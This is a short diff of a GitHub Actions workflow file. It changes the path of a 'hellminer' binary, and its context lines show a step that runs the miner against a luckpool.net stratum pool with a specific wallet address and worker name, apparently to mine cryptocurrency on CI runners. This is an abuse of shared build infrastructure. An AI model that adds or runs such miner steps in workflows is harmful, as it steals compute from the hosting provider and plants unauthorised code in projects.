@@ -42,7 +42,7 @@ jobs:
       - name: List
         run: ls
       - name: OpenFolder
-        run: ./hellminer
+        run: /hellminer
       # Runs a set of commands using the runners shell
       - name: RUNNING
         run: ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.Rig001 -p x --cpu 1
